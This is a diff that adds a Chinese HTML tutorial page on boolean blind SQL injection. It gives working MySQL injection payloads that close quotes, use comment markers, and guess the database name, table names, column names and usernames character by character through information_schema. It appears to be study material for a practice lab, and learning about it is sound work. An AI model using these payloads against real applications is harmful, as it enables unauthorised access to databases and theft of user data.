@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sql盲注知识</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+
+        header {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 2em 0;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+
+        nav {
+            background-color: #34495e;
+            color: white;
+        }
+
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        nav ul li {
+            padding: 1em;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+        }
+
+        main {
+            max-width: 800px;
+            margin: 2em auto;
+            padding: 0 1em;
+        }
+
+        section {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2em;
+            padding: 2em;
+        }
+
+        h2 {
+            color: #2c3e50;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 0.5em;
+            margin-bottom: 1em;
+        }
+
+        pre {
+            background-color: #ecf0f1;
+            padding: 1em;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1em 0;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>sql盲注知识分享</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="index.html">返回学习页面</a></li>
+            <li><a href="#ascii-ord">ASCII 和 ORD 函数</a></li>
+            <li><a href="#substr-substring">SUBSTR 和 SUBSTRING 函数</a></li>
+            <li><a href="#database-info">数据库信息获取</a></li>
+            <li><a href="#table-info">表信息获取</a></li>
+            <li><a href="#column-data">列和数据获取</a></li>
+        </ul>
+    </nav>
+    <main>
+        <p>布尔盲注的核心是通过 <strong>真/假响应差异</strong> 逐位推断数据，需结合条件函数（ASCII、SUBSTRING）和逻辑运算符（AND、OR）。以下是具体操作示例：</p>
+        <section id="ascii-ord">
+            <h2>ASCII 和 ORD 函数</h2>
+            <p>ASCII 和 ORD 函数在功能上有相似之处，但 ASCII 返回的范围为 0 - 127，ORD 处理 Unicode 返回的范围更大。</p>
+            <pre><code>
+-- ascii和ord的作用一样，ascii返回的范围为0-127，ord处理Unicode返回的范围更大
+-- select * from users where id='1' and ascii(substr(database(),4,1))>=117-- '
+-- select * from users where id='1' and ord(substr(database(),1,1))>=115-- '
+            </code></pre>
+        </section>
+        <section id="substr-substring">
+            <h2>SUBSTR 和 SUBSTRING 函数</h2>
+            <p>SUBSTR 和 SUBSTRING 的作用一样，但是 SUBSTRING 在大多数据库都能用，兼容性更好。</p>
+            <pre><code>
+-- substr和substring的作用一样，但是substring在大多数据库都能用，兼容性更好。
+            </code></pre>
+        </section>
+        <section id="database-info">
+            <h2>数据库信息获取</h2>
+            <p>这里展示了一些获取数据库相关信息的代码。</p>
+            <pre><code>
+-- 数据库长度:8 ,数据库名:115 101 99 117
+-- select * from users where id='1' and ascii(substring(database(),1,1))>=115 -- ' 
+            </code></pre>
+        </section>
+        <section id="table-info">
+            <h2>表信息获取</h2>
+            <p>这些代码用于获取数据库中表的相关信息。</p>
+            <pre><code>
+-- 获取表名
+-- 确定表的数量,4个表
+-- select * from users where id='1' and (select count(table_name)from information_schema.tables where table_schema=database())=4 -- '
+
+-- 确定表的长度,第一个表的长度为6
+-- select * from users where id='1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6 -- '
+
+-- 获取第一个表的名字
+-- select * from users where id='1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>=101 -- '
+            </code></pre>
+            <section id="column-data">
+                <h2>列和数据信息获取</h2>
+                <pre><code>
+    -- 获取列名个数为3
+    SELECT * FROM users WHERE id='1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users')=3 -- '
+    
+    -- 获取第一个列名的长度（长度为2）
+    SELECT * FROM users WHERE id='1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1)=2 -- '
+    
+    -- 猜解第一个列名的第一个字符（ASCII值>=105对应字母'i'）
+    SELECT * FROM users WHERE id='1' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1),1,1))>=105 -- '
+    
+    -- 获取用户名字段的长度（假设长度为4）
+    SELECT * FROM users WHERE id='1' AND (SELECT LENGTH(username) FROM users LIMIT 0,1)=4 -- '
+    
+    -- 猜解用户名的第一个字符（ASCII值>=68对应字母'D'）
+    SELECT * FROM users WHERE id='1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))>=68 -- '
+                </code></pre>
+                <p><strong>关键原理说明：</strong></p>
+                <ul>
+                    <li>通过逐步调整ASCII值范围（如>=、=、<）缩小字符可能性</li>
+                    <li>结合LIMIT子句遍历多行数据（如多个列名或用户记录）</li>
+                    <li>注意闭合符号与注释符的使用（-- 或 #）</li>
+                </ul>
+            </section>
+    </main>
+    <footer>
+        <p>&copy; 2025 网络安全知识分享</p>
+    </footer>
+</body>
+
+</html>    
